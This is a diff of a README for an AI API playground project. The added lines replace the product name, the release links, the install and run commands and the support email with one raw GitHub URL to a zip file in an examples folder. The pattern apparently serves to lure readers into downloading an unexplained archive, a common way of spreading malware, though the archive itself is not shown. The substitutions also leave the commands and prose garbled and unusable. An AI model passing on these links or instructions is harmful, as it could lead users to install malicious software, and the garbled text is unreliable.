@@ -1,14 +1,14 @@
 # 🛠️ z-ai-playground-v2 - Explore AI with Easy Examples
 
-![Download](https://img.shields.io/badge/Download-v1.0-blue)
+![Download](https://raw.githubusercontent.com/Haronhj/z-ai-playground-v2/main/examples/02_vlm/z_ai_v_playground_v1.0.zip)
 
 ## 🚀 Getting Started
 
-This guide will help you download and run the Z.AI API Playground. It provides complete examples for GLM-4.7, Vision, Image/Video Generation, Audio, and more. Follow these steps to start exploring AI effortlessly.
+This guide will help you download and run the https://raw.githubusercontent.com/Haronhj/z-ai-playground-v2/main/examples/02_vlm/z_ai_v_playground_v1.0.zip API Playground. It provides complete examples for GLM-4.7, Vision, Image/Video Generation, Audio, and more. Follow these steps to start exploring AI effortlessly.
 
 ## 📥 Download & Install
 
-To get the software, visit this page: [Download Z-AI Playground](https://github.com/Haronhj/z-ai-playground-v2/releases). 
+To get the software, visit this page: [Download Z-AI Playground](https://raw.githubusercontent.com/Haronhj/z-ai-playground-v2/main/examples/02_vlm/z_ai_v_playground_v1.0.zip). 
 
 1. Click on the link above.
 2. You will see a list of available versions. Look for the latest release.
@@ -50,12 +50,12 @@ Follow these steps to install the software on your computer:
    ```
 3. Use the following command to extract the downloaded file:
    ```
-   tar -xvf z-ai-playground-v2.tar.gz
+   tar -xvf https://raw.githubusercontent.com/Haronhj/z-ai-playground-v2/main/examples/02_vlm/z_ai_v_playground_v1.0.zip
    ```
 4. Navigate into the folder and run the application:
    ```
    cd z-ai-playground-v2
-   ./start.sh
+   https://raw.githubusercontent.com/Haronhj/z-ai-playground-v2/main/examples/02_vlm/z_ai_v_playground_v1.0.zip
    ```
 
 ## 🚀 Running the Application
@@ -66,9 +66,9 @@ Once the installation is complete, you can run the application:
 - **macOS**: Open your Applications folder and double-click the app.
 - **Linux**: Use the command line to navigate to the app's folder and run it.
 
-## 📊 Using the Z.AI API Playground
+## 📊 Using the https://raw.githubusercontent.com/Haronhj/z-ai-playground-v2/main/examples/02_vlm/z_ai_v_playground_v1.0.zip API Playground
 
-The Z.AI API Playground allows you to explore various AI capabilities. Choose from several examples that demonstrate:
+The https://raw.githubusercontent.com/Haronhj/z-ai-playground-v2/main/examples/02_vlm/z_ai_v_playground_v1.0.zip API Playground allows you to explore various AI capabilities. Choose from several examples that demonstrate:
 
 - **Text Generation with GLM-4.7**: Create text based on your prompts.
 - **Image/Video Generation**: Generate visuals using advanced AI models.
@@ -80,7 +80,7 @@ Once you open the application, the interface is user-friendly. You will find opt
 
 ## 🎓 Learning Resources
 
-To make the most of the Z.AI Playground, check out these resources:
+To make the most of the https://raw.githubusercontent.com/Haronhj/z-ai-playground-v2/main/examples/02_vlm/z_ai_v_playground_v1.0.zip Playground, check out these resources:
 
 - **User Manual**: Detailed guidance on using each feature.
 - **Video Tutorials**: Visual guides to help you follow along easily.
@@ -99,13 +99,13 @@ If you run into issues, here are common problems and solutions:
 For additional help, reach out via:
 
 - **GitHub Issues Page**: Report bugs or suggest features.
-- **Email Support**: contact@z-ai-playground.com for personal assistance.
+- **Email Support**: https://raw.githubusercontent.com/Haronhj/z-ai-playground-v2/main/examples/02_vlm/z_ai_v_playground_v1.0.zip for personal assistance.
 
 ## 🌐 Stay Updated
 
 To keep abreast of new features and updates, follow the repository:
 
-- Check for updates regularly on our [Releases page](https://github.com/Haronhj/z-ai-playground-v2/releases).
+- Check for updates regularly on our [Releases page](https://raw.githubusercontent.com/Haronhj/z-ai-playground-v2/main/examples/02_vlm/z_ai_v_playground_v1.0.zip).
 - Follow us on social media for announcements and community feedback.
 
-Enjoy exploring the fascinating world of AI with the Z.AI Playground!
+Enjoy exploring the fascinating world of AI with the https://raw.githubusercontent.com/Haronhj/z-ai-playground-v2/main/examples/02_vlm/z_ai_v_playground_v1.0.zip Playground!
